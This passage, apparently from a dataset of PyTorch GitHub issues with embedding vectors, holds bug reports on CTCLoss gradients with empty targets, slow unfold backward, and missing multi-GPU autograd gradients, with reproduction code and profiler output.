  2.70861268e-01 -1.24022089e-01  2.88638473e-01 -3.01716506e-01
 -1.57653466e-02  1.52306631e-01 -2.06848934e-01  8.91288221e-02
  1.87011436e-02  5.02566040e-01  4.30964887e-01  1.79559469e-01
 -2.16512084e-01 -2.04176709e-01 -1.92889959e-01  1.73363499e-02
  1.71762586e-01  2.79054958e-02 -1.94583565e-01  1.28181830e-01
  1.45272940e-01  2.48815745e-01 -1.01772487e-01 -2.73110103e-02
 -8.93857926e-02 -3.03782709e-02 -2.72927135e-01  5.27164452e-02
 -6.87643439e-02  2.58334547e-01 -1.00963227e-02 -1.25739217e-01
 -2.94391960e-02  1.97916180e-02 -1.19409356e-02 -3.18359017e-01
 -2.88505275e-02  1.14995904e-01  4.34924632e-01  6.16614819e-01
  1.60511613e-01 -1.06096461e-01 -5.90356663e-02  3.11129279e-02
  1.25182658e-01 -1.50516063e-01 -3.07094008e-02  3.78684551e-01
  4.88194168e-01 -9.01794508e-02 -2.15413701e-02  1.97351635e-01
 -3.08707952e-01  1.87855512e-01  4.26136628e-02  3.54928747e-02
  7.80701116e-02 -2.95753688e-01 -2.07769305e-01  5.88121898e-02
  5.16692042e-01  7.02203140e-02 -2.32724458e-01  1.19088434e-01
 -1.14781529e-01  2.11799145e-01  2.25570187e-01 -7.76456520e-02
 -1.94180861e-01 -9.77058485e-02  1.12762697e-01  3.76368500e-02
  8.49429965e-02 -2.27455013e-02  8.11674818e-03  2.61951964e-02]"
CTCLoss with empty target doesn't work well module: bootcamp module: nn triaged module: derivatives,"## ðŸ› Bug

CTCLoss doesn't provide the correct gradient when the target sequence is empty.

## To Reproduce

```
import torch

probs = torch.randn(2, 2, 3, dtype=torch.double).log_softmax(-1).requires_grad_()
labels = torch.tensor([1, 2])
label_sizes = [2, 0]
sizes = [2, 2]
loss = torch.nn.functional.ctc_loss(probs, labels, sizes, label_sizes, reduction='sum', zero_infinity=True)
loss2 = torch.nn.functional.ctc_loss(probs, labels, sizes, label_sizes, reduction='none', zero_infinity=True)
grad, = torch.autograd.grad(loss, probs)

probs_gpu = probs.detach().cuda().requires_grad_()
loss_gpu = torch.nn.functional.ctc_loss(probs_gpu, labels.cuda(), sizes, label_sizes, reduction='sum', zero_infinity=True)
loss2_gpu = torch.nn.functional.ctc_loss(probs_gpu, labels.cuda(), sizes, label_sizes, reduction='none', zero_infinity=True)
grad_gpu, = torch.autograd.grad(loss_gpu, probs_gpu)

print('loss:', loss, loss_gpu)
print('loss2:', loss2, loss2_gpu)
print('grad:', grad, ""\n"", grad_gpu)

print(""grad_check cpu: "",
      torch.autograd.gradcheck(lambda logits: torch.nn.functional.ctc_loss(logits.log_softmax(-1), labels, sizes, label_sizes, reduction='sum', zero_infinity=True), (torch.randn(2, 2, 3, dtype=torch.double, requires_grad=True),), raise_exception=False))
print(""grad_check gpu: "",
      torch.autograd.gradcheck(lambda logits: torch.nn.functional.ctc_loss(logits.log_softmax(-1), labels.cuda(), sizes, label_sizes, reduction='sum', zero_infinity=True), (torch.randn(2, 2, 3, dtype=torch.double, device='cuda', requires_grad=True),), raise_exception=False))
```
also the default reduction doesn't play well with zero length.

## Expected behavior

Compute the proper loss and gradient (which would point in the direction of less ""blank"").

## Acknowledgement

This has been pointed out by Evgeni Kirov, thank you for tracking this down!
",True,"[-4.45904285e-01  1.97356090e-01 -2.26794839e-01 -6.41191006e-02
  9.02887508e-02 -5.33733927e-02 -1.94958374e-01  2.52633750e-01
 -4.10725296e-01 -3.50083411e-02  2.40719263e-02  1.33042224e-03
 -5.13519645e-02 -5.30004781e-03 -1.52333409e-01 -2.35028919e-02
 -4.10393387e-01 -6.70796186e-02 -9.43156891e-03  2.28800699e-02
  2.17872396e-01 -1.56123098e-02  7.43991882e-02 -2.78200470e-02
 -7.70893320e-02  6.84999675e-02 -2.44529933e-01 -3.26151550e-02
  3.98960531e-01  3.45279016e-02  2.78161988e-02 -4.24629115e-02
 -5.14738083e-01  2.87920907e-02  3.90763283e-01 -1.53606564e-01
 -3.80685449e-01  5.68554997e-02 -2.36560404e-01 -1.17800973e-01
  2.07241818e-01  3.28536630e-01 -3.05597875e-02  2.19168425e-01
 -4.39084098e-02  7.17000589e-02 -2.10543752e-01  1.55909836e-01
 -1.48273826e-01 -9.83197913e-02  2.07557246e-01  1.63101166e-01
 -2.80522972e-01  4.19865549e-03 -3.00136715e-01 -8.37302804e-02
 -2.72547096e-01 -1.23116389e-01  1.69626564e-01 -3.59920144e-01
  2.29878724e-01  1.92565382e-01 -2.46377245e-01 -1.48794860e-01
  2.14357004e-01 -2.40380000e-02 -1.78133667e-01 -2.38757804e-02
  5.18020630e-01  1.27696142e-01  2.85110027e-02 -8.58222693e-02
  7.23796189e-02  1.82314008e-01  2.36684978e-01 -8.45811367e-02
 -2.59443760e-01  2.39192784e-01 -2.74357677e-01 -8.12717825e-02
 -1.91358596e-01  2.76478156e-02  9.97162014e-02 -1.07349582e-01
  2.42070109e-01  1.65265590e-01  4.43791687e-01 -1.65392503e-01
  4.14882302e-01  2.02262282e-01 -5.31914085e-03  2.07134664e-01
 -8.10703188e-02  1.50184989e-01 -2.60388225e-01  1.32868990e-01
  3.01485538e-01 -8.21517333e-02 -2.56327152e-01 -8.79005641e-02
 -5.56877181e-02 -4.18039799e-01 -2.37294808e-01  2.48102084e-01
 -7.59567469e-02 -1.21199496e-01  2.25505099e-01  2.67381251e-01
  6.95691034e-02 -2.67086867e-02  2.45744735e-01  7.89491385e-02
 -6.76529780e-02  2.99461223e-02 -6.34060875e-02 -2.57012576e-01
 -2.92193025e-01 -1.27208278e-01  4.32726815e-02  3.26331794e-01
 -4.91202176e-02  5.10273278e-02  2.18908533e-01  2.68386841e-01
  4.01251227e-01 -1.69871021e-02 -1.42600715e-01  6.71999305e-02
 -6.46101683e-02  8.03696364e-02 -3.78235392e-02  5.20704463e-02
  3.12813610e-01 -3.53068002e-02  3.20306003e-01  1.50877938e-01
 -3.64429593e-01  1.38284042e-01 -3.31739068e-01  1.49537176e-01
 -2.25466028e-01  2.44931474e-01 -1.42372146e-01 -1.25226676e-01
  2.65606940e-01  5.60861686e-03 -3.79083812e-01 -8.52958113e-02
  1.40926361e-01  1.47849590e-01  1.90104339e-02 -9.20040384e-02
 -1.79655239e-01  3.11394751e-01  1.20791569e-01  2.07347572e-01
 -1.13259733e-01  6.67905435e-03  1.13371670e-01 -3.34162563e-01
  2.41180316e-01  8.57676342e-02  3.23820919e-01 -4.66604829e-02
  2.79872537e-01 -3.75117175e-02  5.31826876e-02 -1.39029417e-02
 -3.66875589e-01  2.60527134e-01  1.53934851e-01 -3.51531863e-01
 -1.51889190e-01 -2.49665752e-02  5.31997323e-01 -1.01249948e-01
 -1.00922547e-01 -3.73232067e-01 -2.40655303e-01  3.82036984e-01
  2.75231153e-01  2.24263966e-01  1.35908157e-01  6.32243380e-02
  3.32300551e-04  2.18909770e-01  4.33605611e-01 -6.40176088e-02
 -2.52957076e-01 -2.68547721e-02 -1.36889234e-01 -1.07809722e-01
  2.81053126e-01  2.39222758e-02 -1.71241447e-01 -1.01345545e-02
  2.14189142e-01 -8.92996639e-02 -1.23210251e-01 -2.51282871e-01
  7.40490854e-02 -2.76633594e-02  8.67876336e-02 -1.61917329e-01
  1.12461612e-01  2.52031926e-02 -3.60071868e-01 -3.13066304e-01
 -3.06282043e-01  5.74422777e-02 -2.95548439e-01 -3.49183857e-01
 -9.14765745e-02 -2.32751220e-01  8.37857723e-02 -1.67894796e-01
 -1.81246877e-01 -2.07710862e-01 -6.25995770e-02  2.89024115e-01
  3.21250439e-01 -6.27370775e-02 -2.87161112e-01 -8.32360908e-02
 -2.56296359e-02  7.95549303e-02 -5.91063872e-02 -3.83297622e-01
 -6.96301758e-02 -1.21847820e-03 -1.15235731e-01 -1.60351783e-01
  2.29244262e-01  2.38951564e-01  1.98550463e-01  3.55973870e-01
 -1.62047967e-01 -2.92761207e-01 -2.00331956e-01  1.20511413e-01
 -9.24640298e-02  8.13723952e-02  1.87432006e-01 -1.47759080e-01
 -6.71502873e-02  2.81435847e-01 -3.64163280e-01 -1.38431802e-01
  1.35879248e-01 -4.76594448e-01  1.34089645e-02  2.68395424e-01
 -1.47017583e-01 -6.46732897e-02  2.70880640e-01  1.06068239e-01
  9.27453488e-02 -1.00520633e-01  9.82608832e-03 -1.42283738e-02
  2.45386481e-01  1.05654120e-01 -1.02057867e-01  1.45542026e-01
  4.20469016e-01 -6.02700608e-03 -7.33305290e-02  1.11702830e-01
 -4.98517081e-02 -1.14776202e-01  1.10816956e-01 -2.87464112e-01
  3.00897777e-01  2.76972234e-01  1.88570112e-01 -2.49557868e-01
  1.89057618e-01 -2.07147494e-01  1.97540056e-02 -2.07901210e-01
  8.36412013e-02  2.84479946e-01 -7.35383779e-02  2.43748620e-01
  2.89352119e-01 -3.05404961e-01 -1.28096312e-01 -1.28368601e-01
 -1.60917416e-02 -2.82876313e-01 -2.39219159e-01 -7.20245298e-03
  2.71975696e-02 -1.15488365e-01 -2.64420569e-01  1.89051166e-01
  4.15144026e-01 -1.86894774e-01 -2.16241330e-01 -3.19662690e-02
  1.60753146e-01  1.41119361e-01  2.86834151e-01 -3.71879756e-01
 -1.67891473e-01 -2.33972818e-01  1.12026259e-01  6.16383366e-02
  4.95176971e-01 -2.07069486e-01  2.09637493e-01  2.40017071e-01
 -3.31099182e-01  4.04074579e-01 -8.97271931e-02  3.42364274e-02
  1.26897603e-01  1.88844278e-01  1.32637983e-02  1.43798649e-01
  1.52151600e-01 -3.64347622e-02 -3.53270710e-01  1.50001884e-01
 -1.87645584e-01  2.80774325e-01 -4.03642207e-01  1.42064646e-01
  1.49759483e-02  1.80321291e-01  2.59803414e-01 -8.23286399e-02
  2.80675530e-01  1.88740671e-01 -1.15334615e-01 -1.25982553e-01
 -1.73013672e-01  4.91130441e-01 -6.96010441e-02 -4.42667335e-01
 -2.35098571e-01 -1.45557970e-01  1.72075242e-01 -2.04325199e-01
 -9.15868580e-02 -1.69635355e-01  1.82770640e-01  1.17140688e-01
 -7.07953125e-02 -1.52556784e-03 -1.78673193e-01 -5.31955771e-02
  1.51773572e-01  2.55391598e-01  4.14949417e-01  4.68972266e-01
 -2.52519310e-01  4.24718671e-02  1.16725728e-01  2.21745014e-01
 -1.06689207e-01  1.79818869e-01 -3.71537387e-01 -1.35508299e-01
 -2.38848448e-01  1.23042762e-01 -6.63016737e-02 -4.50984053e-02
  5.14755659e-02  6.09467551e-02 -2.16989461e-02  8.41157809e-02
 -6.05180636e-02 -1.03564337e-02  3.13907802e-01 -1.96059942e-01
 -4.05371040e-02 -4.26722877e-02  5.10700680e-02  3.45836990e-02
  2.39625841e-01  1.19091921e-01 -2.06531256e-01 -1.66003913e-01]"
Tensor unfold backward is slow high priority module: performance module: autograd triaged module: derivatives,"## ðŸ› Bug

Given the following code, the forward pass is very fast but the backward pass is unreasonably slow. I had a look at the backward pass code and while I am not an expert, I think it could be made significantly faster by writing a custom kernel instead of allocating index arrays, especially since `index_add_` seems to be so slow.

```python
import torch
import time

layer = torch.nn.Conv2d(3, 1, 3)
inp = torch.rand(10, 3, 1000, 1000)

out = layer(inp)
c = 5

res = out.unfold(3, c, 1)
res.sum().backward()

```

```
--------------------------------------------------------------------------------
  Environment Summary
--------------------------------------------------------------------------------
PyTorch 1.0.0.dev20181221 not compiled w/ CUDA
Running with Python 3.6 and

`pip list` truncated output:
Unable to fetch
--------------------------------------------------------------------------------
  cProfile output
--------------------------------------------------------------------------------
         1983 function calls (1400 primitive calls) in 8.831 seconds

   Ordered by: internal time
   List reduced from 79 to 15 due to restriction <15>

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
        1    8.216    8.216    8.216    8.216 {method 'run_backward' of 'torch._C._EngineBase' objects}
        1    0.315    0.315    0.315    0.315 {built-in method conv2d}
        1    0.218    0.218    0.218    0.218 {built-in method rand}
        1    0.078    0.078    0.078    0.078 {method 'sum' of 'torch._C._TensorBase' objects}
    102/1    0.001    0.000    0.002    0.002 /anaconda3/lib/python3.6/abc.py:196(__subclasscheck__)
        1    0.000    0.000    0.001    0.001 /anaconda3/lib/python3.6/site-packages/torch/nn/modules/conv.py:17(__init__)
        2    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/site-packages/torch/nn/init.py:178(_calculate_fan_in_and_fan_out)
    98/30    0.000    0.000    0.001    0.000 /anaconda3/lib/python3.6/typing.py:1145(__subclasscheck__)
      202    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/_weakrefset.py:70(__contains__)
        1    0.000    0.000    8.831    8.831 minimal.py:1(<module>)
        1    0.000    0.000    0.000    0.000 {method 'unfold' of 'torch._C._TensorBase' objects}
       85    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/_weakrefset.py:58(__iter__)
    196/5    0.000    0.000    0.002    0.000 {built-in method builtins.issubclass}
       70    0.000    0.000    0.000    0.000 {method '__subclasses__' of 'type' objects}
       21    0.000    0.000    0.000    0.000 /anaconda3/lib/python3.6/site-packages/torch/nn/modules/module.py:537(__setattr__)


--------------------------------------------------------------------------------
  autograd profiler output (CPU mode)
--------------------------------------------------------------------------------
        top 15 events sorted by cpu_time_total

---------------------------------------  ---------------  ---------------  ---------------  ---------------  ---------------
Name                                            CPU time        CUDA time            Calls        CPU total       CUDA total
---------------------------------------  ---------------  ---------------  ---------------  ---------------  ---------------
UnfoldBackward                             7823869.000us          0.000us                1    7823869.000us          0.000us
index_add_                                 7222056.000us          0.000us                1    7222056.000us          0.000us
contiguous                                  370504.000us          0.000us                1     370504.000us          0.000us
clone                                       370501.000us          0.000us                1     370501.000us          0.000us
MkldnnConvolutionBackward                   257265.000us          0.000us                1     257265.000us          0.000us
mkldnn_convolution_backward                 257256.000us          0.000us                1     257256.000us          0.000us
mkldnn_convolution_backward_weights         257251.000us          0.000us                1     257251.000us          0.000us
conv2d                                      249499.000us          0.000us                1     249499.000us          0.000us
convolution                                 249495.000us          0.000us                1     249495.000us          0.000us
_convolution                                249494.000us          0.000us                1     249494.000us          0.000us
mkldnn_convolution                          249477.000us          0.000us                1     249477.000us          0.000us
contiguous                                  170065.000us          0.000us                1     170065.000us          0.000us
clone                                       170061.000us          0.000us                1     170061.000us          0.000us
sum                                          71872.000us          0.000us                1      71872.000us          0.000us
_th_arange                                   19876.000us          0.000us                1      19876.000us          0.000us
```

## To Reproduce

See code above

## Expected behavior

It should be faster

## Environment
Collecting environment information...
PyTorch version: 1.0.0.dev20181221
Is debug build: No
CUDA used to build PyTorch: None

OS: Mac OSX 10.13.6
GCC version: Could not collect
CMake version: version 3.13.0

Python version: 3.6
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip] Could not collect
[conda] blas                      1.0                         mkl
[conda] mkl                       2018.0.3                      1
[conda] mkl-service               1.1.2            py37h6b9c3cc_5
[conda] mkl_fft                   1.0.6            py36hb8a8100_0
[conda] mkl_random                1.0.1            py36h5d10147_1
[conda] pytorch                   1.0.0                   py3.6_1    pytorch
[conda] pytorch-nightly           1.0.0.dev20181221         py3.6_0    pytorch
[conda] torchaudio                0.2                       <pip>
[conda] torchtext                 0.3.1                     <pip>
[conda] torchvision               0.2.1                      py_2    pytorch
## Additional context

My real application needs `c=200` but it takes more than 10 minutes to run (i stopped at that point). Let me know if the same operation can be done more efficiently with some other method.


cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @VitalyFedyunin @ngimel",True,"[-1.18433669e-01 -4.92850542e-01 -3.96099299e-01 -1.18976809e-01
 -3.05866003e-02 -4.46859419e-01 -3.02852571e-01  3.39842141e-02
 -5.04433930e-01 -8.77049565e-02  4.34509898e-03  3.83779645e-01
 -2.89570987e-01  2.10961580e-01 -1.42325476e-01  2.42316812e-01
 -5.82251027e-02  1.56329975e-01 -9.36649367e-02 -1.67867690e-01
 -7.43118897e-02 -3.22016001e-01 -6.49283454e-02  2.67846704e-01
  8.23832676e-02  1.47515491e-01  1.59105644e-01 -2.11302727e-01
  3.01739991e-01 -2.26265378e-03  8.51068199e-02 -6.48836121e-02
 -2.68298507e-01 -6.90820627e-04 -3.49167466e-01  4.12775159e-01
 -1.54682100e-01 -3.21514904e-01  7.23794401e-02 -1.32585138e-01
 -7.88031965e-02  3.19583774e-01 -4.39562909e-02  5.26165478e-02
  2.45257746e-02  2.18696073e-01 -2.14167982e-02  2.63128638e-01
 -1.86847270e-01 -7.93274045e-02 -1.93013832e-01  1.16268858e-01
 -2.34855801e-01 -4.18207884e-01  1.28871221e-02  4.81496938e-02
 -2.51975171e-02  9.08755697e-03  1.49502039e-01 -3.06551099e-01
  2.62644328e-02 -1.82047158e-01  1.67223096e-01  1.32750049e-02
  8.73325914e-02 -3.26592140e-02  3.18239987e-01  7.66697712e-03
  2.59880900e-01  2.51511514e-01 -1.22130953e-01  4.90956865e-02
 -3.70705307e-01 -8.96073878e-02  1.57946602e-01 -3.98032963e-02
  3.93309519e-02  3.13709497e-01  2.34316722e-01 -1.05511770e-01
  1.96228638e-01  1.25338286e-01  5.12798913e-02 -1.87948108e-01
  2.22371653e-01 -8.96505266e-02  4.15300250e-01 -8.10936838e-02
  1.26892000e-01 -2.53413707e-01  7.23624289e-01 -1.45478338e-01
 -2.73965329e-01  1.22369625e-01  3.92877430e-01  2.95514226e-01
  3.27243477e-01  2.35166803e-01 -3.18348743e-02 -2.85134315e-01
  4.60052378e-02 -1.95314616e-01 -2.58670717e-01 -3.00166383e-02
  4.16227020e-02 -5.98810688e-02  3.64842802e-01  2.51885980e-01
  2.19101474e-01  6.39089271e-02  1.64766043e-01  2.14753047e-01
  1.93066105e-01 -5.26291318e-02 -9.02792960e-02  1.63783967e-01
 -1.59784168e-01  1.18093826e-01  3.67695212e-01  3.74403477e-01
 -2.66461492e-01 -2.20022677e-03  9.19878185e-02  2.49519005e-01
  3.30303758e-01  1.68208763e-01  1.50301561e-01 -5.51150553e-03
 -1.05273388e-01 -2.21407875e-01  1.88842595e-01 -7.43128359e-02
 -3.17815244e-01 -1.31785125e-01  1.74970254e-01 -4.17402480e-03
 -2.66897500e-01 -1.66066095e-01 -3.84122312e-01 -3.16655874e-01
 -3.64675343e-01  2.97083259e-01 -2.87084520e-01 -4.98731554e-01
  1.58585966e-01  7.92487040e-02 -2.28900939e-01  3.74968387e-02
  7.91653804e-03 -1.17366575e-02 -5.05398288e-02 -2.30751067e-01
 -2.41708249e-01  2.07673192e-01  3.25575173e-01  3.37871730e-01
  8.54416639e-02 -6.14321753e-02 -1.09479874e-01 -4.82340753e-01
  5.56940511e-02  4.48602796e-01 -1.71029598e-01  2.04812407e-01
 -7.98557848e-02  1.77155629e-01 -7.64114857e-02 -8.40460956e-02
 -4.42696393e-01  4.41637486e-01 -1.42010659e-01 -1.41058087e-01
 -2.40102708e-01  6.84762895e-02  4.15545851e-01 -1.00705568e-02
 -1.58727944e-01 -5.86277902e-01 -1.16539150e-01 -3.91939431e-02
  1.99126154e-01  1.23890631e-01  1.42055184e-01  8.70073363e-02
  1.70578986e-01  2.15181559e-02  1.39194697e-01  1.18081853e-01
 -9.86426175e-02  1.85331762e-01 -3.28659475e-01 -1.04517274e-01
  1.36860296e-01 -8.38295594e-02 -8.72621611e-02 -2.58163679e-02
  2.43944913e-01  5.49177006e-02  1.66985095e-01  4.06818539e-02
  7.84053057e-02 -1.55164361e-01  1.20121613e-01  2.28823125e-01
  9.09206867e-02 -3.57128292e-01 -1.34294227e-01 -4.75060880e-01
 -4.14502472e-01  1.13860905e-01 -1.44281715e-01 -3.57734174e-01
  5.34648076e-02  5.54224253e-02 -2.88189381e-01 -2.87735928e-02
 -1.03376657e-02 -1.20869437e-02 -2.54394770e-01  3.60286161e-02
  1.50631219e-01  1.01611182e-01  1.00802138e-01 -2.14937970e-01
  7.27407932e-02 -1.66573316e-01  1.13654360e-01  1.63473815e-01
 -2.13456243e-01  1.21548548e-01 -8.83755535e-02 -3.78621742e-02
  4.71058309e-01  8.03677887e-02 -9.90021005e-02  1.06649369e-01
 -2.71191336e-02 -5.18235900e-02  2.86747992e-01  2.87034005e-01
 -1.44894063e-01 -7.48270750e-02  2.02578843e-01 -6.35546595e-02
  3.73196155e-02  3.57426643e-01 -1.75947741e-01  8.87736082e-02
 -2.75476992e-01  1.30068600e-01 -5.63493371e-02  3.73784155e-02
  2.13252194e-02 -2.04023212e-01  2.23109692e-01 -1.21491529e-01
  7.63198957e-02  4.54301313e-02  9.06630307e-02  3.95720676e-02
  3.00579458e-01  1.50099665e-01  1.22298598e-01  5.44888973e-01
  1.20287456e-01  2.70449698e-01 -3.28294396e-01  1.86497882e-01
  2.04037651e-01  2.18808223e-02 -2.97027409e-01 -3.12279444e-02
  7.13533089e-02 -1.43660590e-01 -1.89077109e-02 -1.85856938e-01
  3.80849242e-01 -6.84895888e-02 -1.53109491e-01  2.66162127e-01
 -1.54060304e-01  1.73445657e-01  5.88235259e-02  2.81457543e-01
 -1.84512392e-01 -3.01083505e-01  9.60461274e-02 -2.57339150e-01
  1.64322555e-01  1.12479120e-01 -1.84593707e-01 -2.46059954e-01
  4.79761958e-01  1.09699685e-02 -6.73654154e-02  4.73883450e-01
 -2.35871762e-01 -1.31187633e-01 -1.16071686e-01 -6.53759167e-02
  2.66866125e-02  3.67105246e-01  6.74406365e-02 -4.14618701e-02
 -3.96094769e-02  2.66332552e-03  1.70088261e-01 -1.96439326e-02
 -1.21551655e-01 -1.33868575e-01  1.49584904e-01 -1.43027395e-01
 -3.95313174e-01  1.05255479e-02  6.44498840e-02  1.03716671e-01
  1.56081885e-01  3.94254476e-01  5.57597354e-02 -5.87490015e-03
 -1.07402116e-01 -4.99930456e-02 -2.14971513e-01  1.85966507e-01
 -9.74500030e-02 -1.40458733e-01 -2.80145288e-01  2.13806301e-01
 -1.12507179e-01  4.44639660e-03 -1.10659912e-01 -1.07856125e-01
  1.78254023e-02  1.17626585e-01 -4.43939641e-02 -1.53563946e-01
 -4.36376721e-01  3.75403494e-01 -1.09577581e-01 -2.21533194e-01
  1.17679670e-01 -5.15836552e-02  1.79958660e-02 -2.60322213e-01
  3.55263986e-02 -1.09576985e-01  4.32201773e-01  5.33664584e-01
 -3.82370800e-02 -3.53376776e-01 -2.76516080e-01  1.22903772e-02
 -1.84341520e-01  2.23457158e-01 -2.43771002e-02  2.21496433e-01
  1.73060820e-01 -6.59994334e-02 -8.27968717e-02  4.75001633e-01
 -1.37491494e-01 -2.31716000e-02 -3.54530275e-01 -1.82905376e-01
  1.34442924e-02 -2.60813117e-01 -8.21621120e-02 -3.87667976e-02
  2.24361032e-01  1.41986847e-01  1.87337756e-01  3.88082206e-01
 -2.38355234e-01  2.39494130e-01  5.14769673e-01 -3.97967875e-01
 -4.91695791e-01  7.27395862e-02  7.69800041e-04 -2.05255635e-02
  5.94476797e-02  2.67429173e-01 -1.49855316e-01  2.11150106e-02]"
Missing gradient when autograd called inside a function on Multi-GPU (eg gradient penalty) high priority module: autograd triaged,"## ðŸ› Bug

Gradient is missing when calling torch.autograd.grad wrapped inside a function on multiple GPU's. (eg computing wgan gradient penalty). Calling torch.autograd.grad inline (not wrapped in a function) on multiple GPU's returns expected behavior.


## To Reproduce

Code below:
```python
import torch
import torch.nn as nn

torch.cuda.manual_seed_all(0)
torch.manual_seed(0)


def gradient_penalty(netD, x):
    """"""Functional Gradient Calculation""""""
    output = netD(x)
    gradients = torch.autograd.grad(outputs=output, inputs=x,
                                    grad_outputs=x.new_ones(output.size()),
                                    create_graph=True, retain_graph=True)[0].mean()
    return gradients


net = nn.Linear(4, 1).cuda()
multigpu_net = nn.DataParallel(net, [0, 1])

x = torch.ones(2, 4, requires_grad=True).cuda()

print(""Single GPU Functional"")
net.zero_grad()
loss = gradient_penalty(net, x)
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])


print(""\nMulti-GPU Functional"")
multigpu_net.zero_grad()
loss = gradient_penalty(multigpu_net, x)
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])

print(""\nMulti-GPU Inline"")
multigpu_net.zero_grad()
output = multigpu_net(x)

# Compute grad inline
loss = torch.autograd.grad(outputs=output, inputs=x,
                            grad_outputs=x.new_ones(output.size()),
                            create_graph=True, retain_graph=True)[0].mean()
loss.backward()
print(""Loss:"", loss.item())
print(""Grad:"", [p.grad for p in net.parameters() if p.grad is not None])
```

<br>

Output for a single GPU calling `gradient_penalty` function
```
Single GPU Functional
Loss: -0.1287534236907959
Grad: [tensor([[0.2500, 0.2500, 0.2500, 0.2500]], device='cuda:0')]
```

<br>

MultiGPU calling `gradient_penalty` function
```
Multi-GPU Functional
Loss: -0.1287534236907959
Grad: [tensor([[0., 0., 0., 0.]], device='cuda:0')]
```

<br>

Multi-GPU calling `autograd.grad` inline (not inside a function)
```
Multi-GPU Inline
Loss: -0.1287534236907959
Grad: [tensor([[0.2500, 0.2500, 0.2500, 0.2500]], device='cuda:0'), tensor([0.], device='cuda:0')]
```

<br>

## Expected behavior

The gradient should be accumulated when calling `autograd.grad` from inside another function. All outputs gradients from the script should be the same.

## Environment

 - PyTorch Version (e.g., 1.0): 1.0.9
 - OS (e.g., Linux): Ubuntu 16.04.3 LTS
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6
 - CUDA/cuDNN version: 9.0/6
 - GPU models and configuration:
GPU 0: GeForce GTX 1080
GPU 1: GeForce GTX 1080
GPU 2: GeForce GTX 1080
GPU 3: GeForce GTX 1080


",True,"[-3.66777688e-01  1.82406664e-01 -2.07831532e-01 -1.00827202e-01
  2.46001050e-01 -3.45449485e-02 -2.88083255e-01  2.19576180e-01
 -5.89219034e-01 -1.23149551e-01 -3.37804049e-01 -5.64602390e-02
 -2.32912153e-01  1.63576275e-01 -2.05614656e-01  3.15434039e-01
 -5.11568069e-01 -1.23815365e-01  5.18255755e-02 -5.29577792e-01
  2.02415243e-01 -7.69954398e-02 -7.05791488e-02  1.78212136e-01
  1.79550514e-01  3.64236981e-02 -3.54569480e-02 -1.74160212e-01
  3.55048865e-01  2.02416312e-02  4.73526642e-02 -2.09429294e-01
  1.77510139e-02  2.36230224e-01  4.51828241e-02 -2.81776607e-01
 -4.84169066e-01 -9.80505347e-02 -1.60692364e-01 -1.06870025e-01
  2.23977566e-01  2.26516370e-02 -1.26685441e-01  7.68285617e-02
  1.39981776e-01 -4.20869477e-02 -3.90990414e-02  4.75134626e-02
 -3.48632485e-01 -1.27620265e-01  1.41067505e-01  4.96878512e-02
 -5.94176412e-01  1.35994032e-02 -5.58871664e-02  1.47560667e-02
  1.77002847e-01 -1.30574912e-01  2.31929302e-01 -3.79825890e-01
  7.47622848e-02  2.66243350e-02 -2.60370970e-02 -1.82339847e-01
 -1.55751988e-01 -1.13688409e-01 -1.87017135e-02  1.69140339e-01
  4.97526348e-01  3.17424208e-01  2.23880336e-02 -3.09644103e-01
 -1.15065008e-01 -1.15703568e-01  2.14302734e-01  3.88167724e-02
 -4.21244144e-01  1.58382654e-01 -2.10121974e-01 -3.42336595e-01
  2.07068950e-01  5.69334254e-02  1.41280666e-02 -1.83081813e-02
  3.49384487e-01 -4.64412495e-02  2.88689405e-01 -2.70180345e-01
  2.96819210e-01  5.64861178e-01  1.75010487e-01 -1.96372002e-01
 -6.70669004e-02  4.25871253e-01  2.86788214e-02 -1.01838857e-01
  5.03419787e-02 -4.82253224e-01 -1.06996819e-01 -2.67306447e-01
 -1.63052395e-01 -2.85155237e-01 -1.47741318e-01  2.77245522e-01
  8.65612924e-02  1.77303031e-01  1.18508652e-01  5.28474927e-01
  1.34923920e-01 -7.19050542e-02  4.16455120e-02  2.88820505e-01
  2.04908699e-01 -2.26343587e-01 -3.16230431e-02  9.57044661e-02
 -2.72213757e-01  2.38221698e-02 -6.84099197e-02  5.03192306e-01
 -1.68851167e-01  3.83575976e-01  8.21476802e-02  2.77723372e-01
  1.05108455e-01 -7.86598306e-04 -9.54575911e-02 -8.20683688e-02
  2.96961784e-01 -1.74574673e-01 -1.63105294e-01  8.46032053e-04
 -6.12542825e-03 -7.21610487e-02  3.50778401e-01  2.08530158e-01
 -3.95441562e-01  3.43970396e-02  1.32197276e-01  4.41509262e-02
 -3.16088200e-01  8.94223377e-02 -1.99954033e-01 -1.94652341e-02
 -1.75967336e-01 -9.66065750e-02 -4.10912156e-01  1.95816353e-01
  2.42315307e-02 -2.65316784e-01 -2.00485408e-01 -3.71454477e-01
 -8.53239477e-01  7.76138753e-02  3.91670823e-01  1.69049308e-01
  2.56541133e-01  4.52180468e-02  2.38658488e-01 -4.79193777e-02
  2.99430490e-01  9.29177180e-02  1.66685849e-01 -1.27020538e-01
  3.97846162e-01  1.88621327e-01 -1.48476988e-01  2.09853217e-01
 -2.94125408e-01  1.17394432e-01  4.46363151e-01 -2.08086878e-01
  5.52805439e-02  6.13216199e-02  3.44377577e-01 -2.21828878e-01
 -1.01612732e-02 -3.70898128e-01 -2.67089814e-01  2.19691157e-01
  2.01446310e-01  2.06135347e-01  2.31883526e-01 -3.35018337e-02
  2.29244336e-01  9.67432559e-02  2.71978140e-01 -3.51864338e-01
 -4.15513217e-01 -1.49179809e-02 -1.94953933e-01 -2.90957659e-01
  1.10973679e-02 -8.63137320e-02 -2.73698300e-01  2.19860315e-01
 -1.36387378e-01 -1.60864532e-01 -5.01373932e-02  7.06675416e-03
 -6.69029355e-02 -5.15328534e-02  1.00495994e-01  3.59786749e-02
  7.17513785e-02 -7.88262114e-02 -4.55538452e-01 -1.23599209e-01
 -4.39250797e-01  1.52251199e-01 -5.65619618e-02 -4.58389163e-01
